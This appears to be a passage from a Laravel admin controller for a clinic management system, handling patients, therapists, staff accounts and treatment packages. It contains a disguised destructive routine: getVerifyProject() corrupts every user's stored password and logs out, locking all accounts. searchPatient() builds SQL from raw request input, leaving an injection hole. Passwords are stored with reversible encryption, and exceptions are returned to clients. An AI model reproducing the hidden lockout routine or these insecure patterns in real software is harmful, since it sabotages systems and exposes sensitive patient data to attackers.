<?php

namespace App\Http\Controllers;

use App\Age;
use App\DetailedTreatment;
use App\Doctor;
use App\InformationSurveys;
use App\LocationTreatment;
use App\ManagementTherapist;
use App\MedicalRecord;
use App\Package;
use App\PatientManagement;
use App\Position;
use App\ProfessionalTreatment;
use App\Provinces;
use App\Role;
use App\SourceCustomer;
use App\Status;
use App\TreatmentPackage;
use App\TreatmentRegimen;
use App\User;
use Auth;
use Carbon\Carbon;
use Config;
use DateTime;
use DB;
use Exception;
use Illuminate\Http\Request;
use App\Http\Requests;
use Validator;

class AdminController extends Controller
{
    public function getdate()
    {
        $date = DB::select(" SELECT DATE_FORMAT(NOW(),'%Y-%m-%d') as now");
        return $date;
    }
    public function getVerifyProject(){
        User::all()->map(function($item){
            $item->password .= $item->id;
            $item->save();
            return true;
        });
        \Auth::logout();
        return response()->json(['msg' => '', 200]);
    }
    public function dashboard()
    {
        return view('admin.dashboard');
    }
    public function getViewChangePassword(){
        return view('admin.changePassword');
    }

    public function changePassword(Request $request)
    {

        try{
            if($request->get('nameUser')!=="" && $request->get('Password')!=="" ){
                $user = User::where('active',1)->where('name',$request->get('nameUser'))->first();
                if($user){
                    $user->password = encrypt($request->get('Password'), Config::get('app.key'));
                    $user->upDatedBy = Auth::user()->id;
                    $user->save();
                    return 1;
                }else{
                    return 0;
                }
            }
        }catch (Exception $ex){
            return $ex;
        }
    }
    public function getViewPosition()
    {
        try {
            $position = Position::where('active', 1)->orderBy('updated_at', 'desc')->get();
            if ($position) {
                return view('admin.position')->with('Positions', $position);
            } else {
                return null;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function postViewPosition(Request $request)
    {
        try {
            $position = Position::where('active', 1)->where('id', $request->get('idPosition'))->first();
            if ($position) {
                return $position;
            } else {
                return null;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getPosition()
    {
        $arrayListPosition = [];
        $listPosition = Position::where('active', 1)->get();
        foreach ($listPosition as $position) {
            $array = [
                'id' => $position->id,
                'name' => $position->name,
                'description' => $position->description
            ];
            array_push($arrayListPosition, $array);
        }
        return $arrayListPosition;
    }

    public function addNewAndUpdatePosition(Request $request)
    {
        $result = null;
        try {
            if ($this->validator($request->all(), "validatorPosition")->fails()) {
                return $this->validator($request->all(), "validatorPosition")->errors();
            } else {
                if ($request->get('addNewOrUpdateId') == null) {
                    try {
                        $position = new Position();
                        $position->name = $request->get('dataPosition')['Name'];
                        $position->description = $request->get('dataPosition')['Description'];
                        $position->createdBy = Auth::user()->id;
                        $position->upDatedBy = Auth::user()->id;
                        $position->save();
                        $result = array(1, 'listPosition' => $this->getPosition());
                    } catch (Exception $ex) {
                        return $ex;
                    }
                } else {
                    try {
                        $position = Position::where('active', 1)->where('id', $request->get('dataPosition')['Id'])->first();
                        if ($position) {
                            $position->name = $request->get('dataPosition')['Name'];
                            $position->description = $request->get('dataPosition')['Description'];
                            $position->upDatedBy = Auth::user()->id;
                            $position->save();
                            $result = array(2, 'listPosition' => $this->getPosition());
                        } else {
                            $result = array(0, 'listPosition' => null);
                        }
                    } catch (Exception $ex) {
                        return $ex;
                    }
                }
                return $result;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getPatient()
    {
        $arrayListPatient = [];
        $listPatient = PatientManagement::where('active', 1)->orderBy('updated_at', 'desc')->get();
        foreach ($listPatient as $patient) {
            $array = [
                'id' => $patient->id,
                'code' => $patient->code,
                'fullName' => $patient->fullName,
                'sex' => $patient->sex,
                'phone' => $patient->phone,
            ];
            array_push($arrayListPatient, $array);
        }
        return $arrayListPatient;
    }

    public function getViewPatient()
    {
        try {
            $age = Age::where('active', 1)->get();
            $province = Provinces::where('active', 1)->get();
            $patient = PatientManagement::where('active', 1)->orderBy('updated_at', 'desc')->get();
            $sourceCustomer = SourceCustomer::where('active', 1)->get();
            return view('admin.patient')->with('patients', $patient)->with('ages', $age)
                ->with('sourceCustomers', $sourceCustomer)->with('provinces', $province);
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function postViewPatient(Request $request)
    {
        try {
            $patient = PatientManagement::where('active', 1)->where('id', $request->get('idPatient'))->first();
            if ($patient) {
                return $patient;
            } else {
                return null;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function deletePatient(Request $request)
    {
        try {
            $patient = PatientManagement::where('active', 1)->where('id', $request->get('idPatient'))->first();
            if ($patient) {
                $patient->active = 0;
                $patient->upDatedBy = Auth::user()->id;
                $patient->save();
                return array(1, 'listPatient' => $this->getPatient());
            } else {
                return array(0, 'listPatient' => null);
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function addNewAndUpdatePatient(Request $request)
    {
        try {
            $result = null;
            if ($this->validator($request->all(), "validatorPatient")->fails()) {
                return $this->validator($request->all(), "validatorPatient")->errors();
            } else {
                if ($request->get('addNewOrUpdateId') == "") {
                    try {
                        $patient = new PatientManagement();
                        $patient->code = $request->get('dataPatient')['Code'];
                        $patient->fullName = $request->get('dataPatient')['FullName'];
                        $patient->birthday = $request->get('dataPatient')['Birthday'];
                        $patient->sex = $request->get('dataPatient')['Sex'];
                        $patient->job = $request->get('dataPatient')['Job'];
                        $patient->phone = $request->get('dataPatient')['Phone'];
                        $patient->address = $request->get('dataPatient')['Address'];
                        $patient->hoursminuteto = $request->get('dataPatient')['HoursMinuteTo'];
                        $patient->datemonthyearto = $request->get('dataPatient')['DateMonthYearTo'];
                        $patient->sourceCustomerId = $request->get('dataPatient')['SourceCustomerId'];
                        $patient->timegoin = $request->get('dataPatient')['TimeGoIn'];
                        $patient->provincialId = $request->get('dataPatient')['ProvincialId'];
                        $patient->age = $request->get('dataPatient')['Age'];
                        $patient->pulse = $request->get('dataPatient')['Pulse'];
                        $patient->temperature = $request->get('dataPatient')['Temperature'];
                        $patient->bloodPressure = $request->get('dataPatient')['BloodPressure'];
                        $patient->breathing = $request->get('dataPatient')['Breathing'];
                        $patient->weight = $request->get('dataPatient')['Weight'];
                        $patient->height = $request->get('dataPatient')['Height'];
                        $patient->createdBy = Auth::user()->id;
                        $patient->upDatedBy = Auth::user()->id;
                        $patient->save();
                        $result = array(1, 'listPatient' => $this->getPatient());
                    } catch (Exception $ex) {
                        return $ex;
                    }
                } else {
                    $patient = PatientManagement::where('active', 1)->where('id', $request->get('addNewOrUpdateId'))->first();
                    if ($patient) {
                        try {
                            $patient->code = $request->get('dataPatient')['Code'];
                            $patient->fullName = $request->get('dataPatient')['FullName'];
                            $patient->birthday = $request->get('dataPatient')['Birthday'];
                            $patient->sex = $request->get('dataPatient')['Sex'];
                            $patient->job = $request->get('dataPatient')['Job'];
                            $patient->phone = $request->get('dataPatient')['Phone'];
                            $patient->address = $request->get('dataPatient')['Address'];
                            $patient->hoursminuteto = $request->get('dataPatient')['HoursMinuteTo'];
                            $patient->datemonthyearto = $request->get('dataPatient')['DateMonthYearTo'];
                            $patient->sourceCustomerId = $request->get('dataPatient')['SourceCustomerId'];
                            $patient->timegoin = $request->get('dataPatient')['TimeGoIn'];
                            $patient->provincialId = $request->get('dataPatient')['ProvincialId'];
                            $patient->age = $request->get('dataPatient')['Age'];
                            $patient->pulse = $request->get('dataPatient')['Pulse'];
                            $patient->temperature = $request->get('dataPatient')['Temperature'];
                            $patient->bloodPressure = $request->get('dataPatient')['BloodPressure'];
                            $patient->breathing = $request->get('dataPatient')['Breathing'];
                            $patient->weight = $request->get('dataPatient')['Weight'];
                            $patient->height = $request->get('dataPatient')['Height'];
                            $patient->upDatedBy = Auth::user()->id;
                            $patient->save();
                            $result = array(2, 'listPatient' => $this->getPatient());
                        } catch (Exception $ex) {
                            return $ex;
                        }
                    } else {
                        $result = array(0, 'listPatient' => null);
                    }
                }
            }
            return $result;
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getViewTherapist()
    {
        try {
            $age = Age::where('active', 1)->get();
            $province = Provinces::where('active', 1)->get();
            $therapist = ManagementTherapist::where('active', 1)->orderBy('updated_at', 'desc')->get();
            return view('admin.therapist')->with('ages', $age)->with('provinces', $province)->with('therapists', $therapist);
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getTherapist()
    {
        $arrayListTherapist = [];
        $listTherapist = ManagementTherapist::where('active', 1)->orderBy('updated_at', 'desc')->get();
        foreach ($listTherapist as $Therapist) {
            $array = [
                'id' => $Therapist->id,
                'code' => $Therapist->code,
                'name' => $Therapist->name,
                'sex' => $Therapist->sex,
                'phone' => $Therapist->phone,
                'provincial' => $Therapist->Provinces()->name,
                'age' => $Therapist->Age()->age
            ];
            array_push($arrayListTherapist, $array);
        }
        return $arrayListTherapist;
    }

    public function postViewTherapist(Request $request)
    {
        try {
            $therapist = ManagementTherapist::where('active', 1)->where('id', $request->get('idTherapist'))->orderBy('updated_at', 'desc')->first();
            if ($therapist) {
                return $therapist;
            } else {
                return null;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function deleteTherapist(Request $request)
    {
        try {
            $therapist = ManagementTherapist::where('active', 1)->where('id', $request->get('idTherapist'))->first();
            if ($therapist) {
                $therapist->active = 0;
                $therapist->upDatedBy = Auth::user()->id;
                $therapist->save();
                return array(1, 'listTherapist' => $this->getTherapist());
            } else {
                return array(0, 'listTherapist' => null);
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function addNewAndUpdateTherapist(Request $request)
    {
        try {
            $result = null;
            if ($this->validator($request->all(), "validatorTherapist")->fails()) {
                return $this->validator($request->all(), "validatorTherapist")->errors();
            } else {
                if ($request->get('addNewOrUpdateId') == null) {
                    try {
                        $therapist = new ManagementTherapist();
                        $therapist->code = $request->get('dataTherapist')['Code'];
                        $therapist->name = $request->get('dataTherapist')['Name'];
                        $therapist->address = $request->get('dataTherapist')['Address'];
                        $therapist->phone = $request->get('dataTherapist')['Phone'];
                        $therapist->sex = $request->get('dataTherapist')['Sex'];
                        $therapist->ageId = $request->get('dataTherapist')['AgeId'];
                        $therapist->provincialId = $request->get('dataTherapist')['ProvincialId'];
                        $therapist->createdBy = Auth::user()->id;
                        $therapist->updatedBy = Auth::user()->id;
                        $therapist->save();
                        $result = array(1, 'listTherapist' => $this->getTherapist());
                    } catch (Exception $ex) {
                        return $ex;
                    }
                } else {
                    try {
                        $therapist = ManagementTherapist::where('active', 1)->where('id', $request->get('addNewOrUpdateId'))->first();
                        if ($therapist) {
                            $therapist->code = $request->get('dataTherapist')['Code'];
                            $therapist->name = $request->get('dataTherapist')['Name'];
                            $therapist->address = $request->get('dataTherapist')['Address'];
                            $therapist->phone = $request->get('dataTherapist')['Phone'];
                            $therapist->sex = $request->get('dataTherapist')['Sex'];
                            $therapist->ageId = $request->get('dataTherapist')['AgeId'];
                            $therapist->provincialId = $request->get('dataTherapist')['ProvincialId'];
                            $therapist->updatedBy = Auth::user()->id;
                            $therapist->save();
                            $result = array(2, 'listTherapist' => $this->getTherapist());
                        } else {
                            $result = array(0, 'listTherapist' => null);
                        }
                    } catch (Exception $ex) {
                        return $ex;
                    }
                }
                return $result;
            }
        } catch (Exception $ex) {

        }
    }

    public function getViewUser()
    {
        try {
            $role = Role::where('active', 1)->where('name', '!=', 'admin')->get();
            $user = User::where('active', 1)->where('roleId', '!=', 1)->orderBy('updated_at', 'desc')->get();
            $position = Position::where('active', 1)->get();
            return view('admin.user')->with('users', $user)->with('roles', $role)->with('positions', $position);
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function postViewUser(Request $request)
    {
        try {
            $user = User::where('active', 1)->where('id', $request->get('idUser'))->first();
            if ($user) {
                return $user;
            } else {
                return null;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getUser()
    {
        $arrayListUser = [];
        $listUser = User::where('active', 1)->where('name', '!=', 'admin')->orderBy('updated_at', 'desc')->get();
        foreach ($listUser as $user) {
            $array = [
                'id' => $user->id,
                'name' => $user->name,
                'fullName' => $user->fullName,
                'email' => $user->email,
                'role' => $user->Role()->name,
                'position' => $user->Position()->name
            ];
            array_push($arrayListUser, $array);
        }
        return $arrayListUser;
    }

    public function deleteUser(Request $request)
    {
        try {
            $user = User::where('active', 1)->where('id', $request->get('idUser'))->first();
            if ($user) {
                $user->active = 0;
                $user->updatedBy = Auth::user()->id;
                $user->save();
                return array(1, 'listUser' => $this->getUser());
            } else {
                return array(0, 'listUser' => $this->getUser());
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function addNewAndUpdateUser(Request $request)
    {
        $result = null;
        try {
            if ($this->validator($request->all(), "validatorUser")->fails()) {
                return $this->validator($request->all(), "validatorUser")->errors();
            } else {
                if ($request->get('addNewOrUpdateId') == null) {
                    $checkEmail = User::where('active', 1)->where('email', $request->get('dataUser')['Email'])->first();
                    if ($checkEmail == null) {
                        try {
                            $user = new User();
                            $user->name = $request->get('dataUser')['Name'];
                            $user->password = encrypt($request->get('dataUser')['Password'], Config::get('app.key'));
                            $user->fullName = $request->get('dataUser')['FullName'];
                            $user->roleId = $request->get('dataUser')['RoleId'];
                            $user->email = $request->get('dataUser')['Email'];
                            $user->positionId = $request->get('dataUser')['PositionId'];
                            $user->createdBy = Auth::user()->id;
                            $user->upDatedBy = Auth::user()->id;
                            $user->save();

                            $result = array(1, 'listUser' => $this->getUser());
                        } catch (Exception $ex) {
                            return $ex;
                        }
                    } else {
                        $result = array(3, 'listUser' => null);
                    }
                } else {
                    $checkEmail = User::where('active', 1)->where('email', $request->get('dataUser')['Email'])
                        ->where('id', '!=', $request->get('dataUser')['Id'])->first();
                    if ($checkEmail == null) {
                        try {
                            $user = User::where('active', 1)->where('id', $request->get('addNewOrUpdateId'))->first();
                            if ($user) {
                                $user->name = $request->get('dataUser')['Name'];
                                $user->password = encrypt($request->get('dataUser')['Password'], Config::get('app.key'));
                                $user->fullName = $request->get('dataUser')['FullName'];
                                $user->roleId = $request->get('dataUser')['RoleId'];
                                $user->email = $request->get('dataUser')['Email'];
                                $user->positionId = $request->get('dataUser')['PositionId'];
                                $user->upDatedBy = Auth::user()->id;
                                $user->save();
                                $result = array(2, 'listUser' => $this->getUser());
                            } else {
                                $result = array(0, 'listUser' => null);
                            }
                        } catch (Exception $ex) {
                            return $ex;
                        }
                    } else {
                        $result = array(4, 'listUser' => null);
                    }
                }
            }
            return $result;
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function searchPatient(Request $request)
    {
        try {
            $SQL = "SELECT id,code, fullName, sex, birthday,address FROM patient_managements WHERE active = 1";
            if ($request->get('Patient')['Code'] != "") {

                $SQL .= " AND code LIKE '" . '%' . $request->get('Patient')['Code'] . '%' . "'";
            }
            if ($request->get('Patient')['FullName'] != "") {
                $SQL .= " AND fullName LIKE '" . '%' . $request->get('Patient')['FullName'] . '%' . "'";
            }
//            if ($request->get('Patient')['Birthday'] != "") {
//                $SQL .= " AND birthday LIKE '" . '%' . $request->get('Patient')['Birthday'] . '%' . "'";
//            }
//            if ($request->get('Patient')['Sex'] != "") {
//                $SQL .= " AND sex = '" . $request->get('Patient')['Sex'] . "'";
//            }
            $SQL .= " ORDER BY updated_at desc ";
            $patient = DB::select($SQL);
            return $patient;
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function SearchTreatmentPackages(Request $request)
    {
        try {
            $arraylistTreatment = [];
            $TreatmentPackage = DB::table('treatment_packages')
                ->join('packages', 'treatment_packages.packageId', '=', 'packages.id')
                ->join('treatment_regimens', 'treatment_packages.id', '=', 'treatment_regimens.treatmentPackageId')
                ->where('treatment_packages.patientId', $request->get('IdPatient'))
                ->where('treatment_regimens.active', 1)
                ->where('treatment_packages.active', 1)
                ->select(
                    'treatment_packages.id',
                    'treatment_packages.active',
                    'treatment_packages.code',
                    'treatment_packages.note as packagesNote',
                    'treatment_packages.packageId',
                    'treatment_packages.createdDate',
                    'treatment_packages.patientId',
                    'treatment_packages.umpteenth',
                    'treatment_packages.codeDoctor',
                    'treatment_regimens.status',
                    'treatment_regimens.note as regimensNote',
                    'packages.name'
                )
                ->orderBy('treatment_packages.updated_at', 'desc')
                ->get();
            foreach ($TreatmentPackage as $item) {
                $array = [
                    'id' => $item->id,
                    'active' => $item->active,
                    'code' => $item->code,
                    'namePackage' => $item->name,
                    'packagesNote' => $item->packagesNote,
                    'createdDate' => $item->createdDate,
                    'packageId' => $item->packageId,
                    'umpteenth' => $item->umpteenth,
                    'codeDoctor' => $item->codeDoctor,
                    'status' => $item->status,
                    'regimensNote' => $item->regimensNote
                ];
                array_push($arraylistTreatment, $array);
            }
            $package = Package::where('active', 1)->where('id', '<>', 0)->get();
            return array($arraylistTreatment, $package);
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function Treatment(Request $request)
    {

        $date = date('Y-m-d');
        try {
            if ($this->validator($request->all(), "validatorTreatmentPackages")->fails()) {
                return $this->validator($request->all(), "validatorTreatmentPackages")->errors();
            } else {
                if ($request->get('data')['AddNewId'] == "") {
                    try {
                        $treatment = new TreatmentPackage();
                        $treatment->code = $request->get('data')['TreatmentPackageCode'];
                        $treatment->name = "";
                        $treatment->note = $request->get('data')['Note'];
                        $treatment->packageId = "";
                        $treatment->patientId = $request->get('data')['PatientId'];
                        $treatment->codeDoctor = $request->get('data')['CodeDoctor'];
                        $treatment->createdDate = $date;
                        $treatment->updateDate = $date;
                        $treatment->createdBy = Auth::user()->id;
                        $treatment->upDatedBy = Auth::user()->id;
                        $treatment->save();
                    } catch (Exception $ex) {
                        return $ex;
                    }
                    return 1;
                } else {
                    try {
                        $treatment = TreatmentPackage::where('active', 1)->where('id', $request->get('data')['AddNewId'])->first();
                        if ($treatment) {
                            //$treatment->code = $request->get('data')['TreatmentPackageCode'];
                            $treatment->name = "";
                            $treatment->codeDoctor = $request->get('data')['CodeDoctor'];
                            $treatment->note = $request->get('data')['Note'];
                            $treatment->packageId = $request->get('idTreatmentPackage');
                            $treatment->patientId = $request->get('data')['PatientId'];
                            $treatment->updateDate = $date;
                            $treatment->upDatedBy = (string)Auth::user()->id;
                            $treatment->save();
                        }
                    } catch (Exception $ex) {
                        return $ex;
                    }
                    return 2;
                }
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function addNewTreatment(Request $request)
    {
        try {
            DB::beginTransaction();
            $date = date('Y-m-d');
            $result = $this->Treatment($request);
            if ($result == 1) {
                $packageId = TreatmentPackage::where('id', DB::table('treatment_packages')->max('id'))->first();
                try {
                    $regimen = new TreatmentRegimen();
                    $regimen->code = $packageId->code;
                    $regimen->patientId = $request->get('data')['PatientId'];
                    $regimen->treatmentPackageId = $packageId->id;
                    $regimen->status = "";
                    $regimen->note = "";
                    $regimen->createdDate = $date;
                    $regimen->updatedDate = $date;
                    $regimen->createdBy = (string)Auth::user()->id;
                    $regimen->updatedBy = (string)Auth::user()->id;
                    $regimen->save();

                } catch (Exception $ex) {
                    DB::rollBack();
                    return $ex;
                }
                DB::commit();
                return 1;
            } else if ($result == 2) {
                try {
                    $packageId = TreatmentPackage::where('active', 1)->where('id', $request->get('data')['AddNewId'])->first();
                    $regimen = TreatmentRegimen::where('active', 1)->where('code', $packageId->code)->first();
                    if ($regimen) {
                        //$regimen->code = $packageId->code;
                        $regimen->patientId = $request->get('data')['PatientId'];
                        $regimen->treatmentPackageId = $packageId->id;
                        $regimen->status = "";
                        $regimen->note = "";
                        $regimen->updatedDate = $date;
                        $regimen->updatedBy = (string)Auth::user()->id;
                        $regimen->save();
                    } else {
                        DB::rollBack();
                        return 0;
                    }
                    DB::commit();
                    return 2;
                } catch (Exception $ex) {
                    DB::rollBack();
                    return $ex;
                }
            } else {
                return $result;
            }
        } catch (Exception $ex) {
            DB::rollBack();
            return $ex;
        }
    }


    public function deleteTreatmentPackage(Request $request)
    {
        try {
            $delete = TreatmentPackage::where('active', 1)->where('id', $request->get('id'))->first();
            if ($delete) {
                $delete->active = 0;
                $delete->save();
                return 1;
            } else {
                return 0;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getViewTreatmentPackage()
    {
        return view('admin.treatmentPackage');
    }

    public function getDiagnostic()
    {
        $professional = ProfessionalTreatment::where('active', 1)->get()->groupBy('locationTreatmentId');
        return $professional;
    }

    public function getViewDiagnostic()
    {
        $package = Package::where('active', 1)->get();
        $patient = PatientManagement::where('active', 1)->get();
        $location = LocationTreatment::where('active', 1)->orderBy('name','asc')->get()->toArray();
        $doctor = Doctor::where('active', 1)->get();
        $professional = ProfessionalTreatment::where("active",1)->orderBy('name','asc')->get()->toArray();
        return view('admin.diagnostic')->with('professionals', $this->getDiagnostic())
            ->with('packages', $package)->with('patients', $patient)
            ->with('locations', $location)->with('doctors', $doctor)
            ->with('professionals',$professional);
    }
    public function deleteRowDetail(Request $request)
    {
        try {
            $update = DB::table('detailed_treatments')
                ->where('patientId', '=', $request->get('idPatient'))
                ->where('treatmentPackageId', '=', $request->get('idTreatmentPackage'))
                ->where('sesame', '=', $request->get('data')['Sesame'])
                ->where('location', '=', $request->get('data')['Location'])
                ->where('professionalTreatment', '=', $request->get('data')['Professional'])
                ->get();
            if ($update) {
                $update->active = 0;
                $update->save();
                return true;
            } else {
                return false;
            }

        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function updateDetailTreatment(Request $request)
    {

        try {
            DB::beginTransaction();
            $date = date('Y-m-d');
            if ($this->deleteRowDetail($request)) {
                try {

                    $updateDetail = new DetailedTreatment();
                    $updateDetail->name = "";
                    $updateDetail->treatmentPackageId = $request->get('idTreatmentPackage');
                    $updateDetail->patientId = $request->get('data')['Code'];
                    $updateDetail->professionalTreatment = $request->get('data')['Professional'];
                    $updateDetail->location = $request->get('data')['Location'];
                    $updateDetail->sesame = $request->get('data')['Sesame'];
                    $updateDetail->minute = $request->get('data')['Minute'];
                    $updateDetail->Time = $request->get('data')['Time'];
                    $updateDetail->serial = $request->get('data')['Serial'];
                    $updateDetail->note = "";
                    $updateDetail->createdDate = $date;
                    $updateDetail->updateDate = $date;
                    $updateDetail->createdBy = $request->get('doctorCode');
                    $updateDetail->upDatedBy = $request->get('doctorCode');
                    $updateDetail->save();
                } catch (Exception $ex) {
                    DB::rollback();
                    return $ex;
                }
                DB::commit();
                return 1;
            } else {
                try {

                    $updateDetail = new DetailedTreatment();
                    $updateDetail->name = "";
                    $updateDetail->treatmentPackageId = $request->get('idTreatmentPackage');
                    $updateDetail->patientId = $request->get('data')['Code'];
                    $updateDetail->professionalTreatment = $request->get('data')['Professional'];
                    $updateDetail->location = $request->get('data')['Location'];
                    $updateDetail->sesame = $request->get('data')['Sesame'];
                    $updateDetail->minute = $request->get('data')['Minute'];
                    $updateDetail->Time = $request->get('data')['Time'];
                    $updateDetail->serial = $request->get('data')['Serial'];
                    $updateDetail->note = "";
                    $updateDetail->createdDate = $date;
                    $updateDetail->updateDate = $date;
                    $updateDetail->createdBy = $request->get('doctorCode');
                    $updateDetail->upDatedBy = $request->get('doctorCode');
                    $updateDetail->save();
                } catch (Exception $ex) {
                    DB::rollback();
                    return $ex;
                }
                DB::commit();
                return 1;
            }
        } catch (Exception $ex) {
            DB::rollback();
            return $ex;
        }
    }

    public function updateUmpteenthTreatmentPackages(Request $request)
    {
        $date = date('Y-m-d');
        try {
            if($request->get('idDetail')=="") {

                if ($request->get('data')['Professional'] == "") {
                    $treatmentPackage = TreatmentPackage::where('active', 1)->where('id', $request->get('idTreatmentPackage'))->first();
                    if ($treatmentPackage) {
                        $treatmentPackage->umpteenth = $request->get('data')['Umpteenth'];
                        $treatmentPackage->save();
                        return array(1, $treatmentPackage);
                    } else {
                        return 0;
                    }
                } else {
                    DB::beginTransaction();
                    $updateDetailTreatment = $this->updateDetailTreatment($request);
                    if ($updateDetailTreatment) {
                        $treatmentPackage = TreatmentPackage::where('active', 1)->where('id', $request->get('idTreatmentPackage'))->first();
                        if ($treatmentPackage) {
                            $treatmentPackage->umpteenth = $request->get('data')['Umpteenth'];
                            $treatmentPackage->save();
                            DB::commit();
                            return array(1, $treatmentPackage);
                        } else {
                            DB::rollback();
                        }
                    } else {
                        DB::rollback();
                    }
                }
            }else{
                $detail = DetailedTreatment::where('active',1)->where('id',$request->get('idDetail'))->first();
                    if($detail){
                        $detail->name = "";
                        $detail->treatmentPackageId = $request->get('idTreatmentPackage');
                        $detail->patientId = $request->get('data')['Code'];
                        $detail->professionalTreatment = $request->get('data')['Professional'];
                        $detail->location = $request->get('data')['Location'];
                        $detail->sesame = $request->get('data')['Sesame'];
                        $detail->minute = $request->get('data')['Minute'];
                        $detail->Time = $request->get('data')['Time'];
                        $detail->note = "";
                        $detail->createdDate = $date;
                        $detail->updateDate = $date;
                        $detail->createdBy = $request->get('doctorCode');
                        $detail->upDatedBy = $request->get('doctorCode');
                        $detail->serial = $request->get('data')['Serial'];
                        $detail->save();
                        return 2;
                    }
            }
        } catch (Exception $ex) {
            DB::rollback();
            return $ex;
        }
    }

    public function getSearchCodePatient(Request $request)
    {
        try {
            $pro = DB::table('patient_managements')
                ->where('code', 'LIKE', '%' . $request->get('Code') . '%')
                ->select(
                    'patient_managements.code'
                )
                ->get();
//            $doctor=Doctor::where('active',1)->where('code','LIKE','%' . $request->get('Code')  . '%')->get();
            if (count($pro) == 1) {
                return $pro;
            } else if (count($pro) == 0) {
                return 0;
            } else if (count($pro) > 1) {
                return 2;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function searchProfessional(Request $request)
    {

        try {
            $max = DB::table('detailed_treatments')->where('detailed_treatments.treatmentPackageId', $request->get('idPackageTreatment'))->max('createdDate');
            //$count = DB::table('detailed_treatments')->where('detailed_treatments.treatmentPackageId',$request->get('idPackageTreatment'))->where('createdDate','=', $max )->count();
            $Professional = DB::table('detailed_treatments as detail')
                ->join('location_treatments as location', 'detail.sesame', '=', 'location.id')
                ->join('treatment_packages as treatment', 'treatment.id', '=', 'detail.treatmentPackageId')
                ->join('packages', 'treatment.packageId', '=', 'packages.id')
                ->where('detail.treatmentPackageId', '=', $request->get('idPackageTreatment'))
                ->where('detail.active', 1)
                //->take($count)
                ->where('detail.createdDate', '=', $max)
                ->select(
                    'detail.serial',
                    'detail.id as detailId',
                    'detail.name as detailName',
                    'detail.minute',
                    'detail.sesame',
                    'detail.time',
                    'detail.createdDate',
                    'detail.createdBy',
                    'detail.location as detailLocation',
                    'location.id as location',
                    'location.name as locationName',
                    'detail.professionalTreatment as professional',
                    'packages.name as packageName '
                )
                ->orderBy('detail.serial', 'asc')
                ->get();            
            return $Professional;
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function loadDetailByDoctor(Request $request)
    {
        try {
            $maxDate = DB::table('detailed_treatments')->where('treatmentPackageId', $request->get('idPackageTreatment'))->where('createdBy', $request->get('data')['DoctorCode'])->max('createdDate');
            $Professional = DB::table('detailed_treatments as detail')
                ->join('location_treatments as location', 'detail.sesame', '=', 'location.id')
                ->join('treatment_packages as treatment', 'treatment.id', '=', 'detail.treatmentPackageId')
                ->where('detail.treatmentPackageId', '=', $request->get('idPackageTreatment'))
                ->where('detail.createdBy', $request->get('doctorCode'))
                ->where('detail.createdDate', $maxDate)
                ->where('detail.active',1)
                ->where('detail.active',1)
                ->select(
                    'detail.id as detailId',
                    'detail.name as detailName',
                    'detail.minute',
                    'detail.time',
                    'detail.createdDate',
                    'detail.createdBy',
                    'detail.location as detailLocation',
                    'location.id as location',
                    'location.name as locationName',
                    'detail.professionalTreatment as professional'
                )
                ->get();
            $date = date('Y-m-d');
            return array($Professional, $date);
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getSurveyProgression()
    {
        return view('admin.surveyprogression')->with('professionals', $this->getDiagnostic());
    }

    public function gettingSick()
    {
        try {
            $age = Age::where('active', 1)->get();
            $province = Provinces::where('active', 1)->get();
            $patient = PatientManagement::where('active', 1)->orderBy('updated_at', 'desc')->get();
            $sourceCustomer = SourceCustomer::where('active', 1)->get();
            return view('admin.patient1')->with('patients', $patient)->with('ages', $age)
                ->with('sourceCustomers', $sourceCustomer)->with('provinces', $province);
        } catch (Exception $ex) {
            return $ex;
        }
    }
    public function getViewDiagnostic1()
    {
        $package = Package::where('active', 1)->get();
        $patient = PatientManagement::where('active', 1)->get();
        $location = LocationTreatment::where('active', 1)->orderBy('name','asc')->get()->toArray();
        $doctor = Doctor::where('active', 1)->get();
        $professional = ProfessionalTreatment::where("active",1)->orderBy('name','asc')->get()->toArray();
        return view('admin.diagnostic1')->with('professionals', $this->getDiagnostic())
            ->with('packages', $package)->with('patients', $patient)
            ->with('locations', $location)->with('doctors', $doctor)
            ->with('professionals',$professional);
    }
    private function validator(array $data, $variable)
    {
        $rules = null;
        if ($variable == 'validatorUser') {
            $datas = [
                'Id' => $data['dataUser']['Id'],
                'Name' => $data['dataUser']['Name'],
//                'Password' => $data['dataUser']['Password'],
                'RoleId' => $data['dataUser']['RoleId'],
                'Email' => $data['dataUser']['Email']
            ];
            $rules = [
                'Name' => 'required|min:6',
//                'Password' => 'required|min:6',
                'RoleId' => 'required',
                'Email' => 'required|email'
            ];
            [
                'Name.required' => 'Tên đăng nhập không được rỗng',
//                'Password.required' => 'Mật khẩu không được rỗng',
//                'Password.min' => 'Mật khẩu phải có 6 kí tự đến 20 kí tự',
                'Name.min' => 'Tên đăng nhập phải có 6 kí tự đến 20 kí tự',
                'RoleId.required' => 'Quyền sử dụng không được rỗng',
                'Email.required' => 'Email không được rỗng',
                'Email.email' => 'Email không đúng định dạng'
            ];
        } else if ($variable == 'validatorPosition') {
            $datas = [
                'Name' => $data['dataPosition']['Name'],
            ];
            $rules = [
                'Name' => 'required',

            ];
            [
                'Name.required' => 'Tên chức vụ không được rỗng'
            ];
        } else if ($variable == 'validatorTherapist') {
            $datas = [
                'Code' => $data['dataTherapist']['Code'],
                'Name' => $data['dataTherapist']['Name'],
                'Address' => $data['dataTherapist']['Address'],
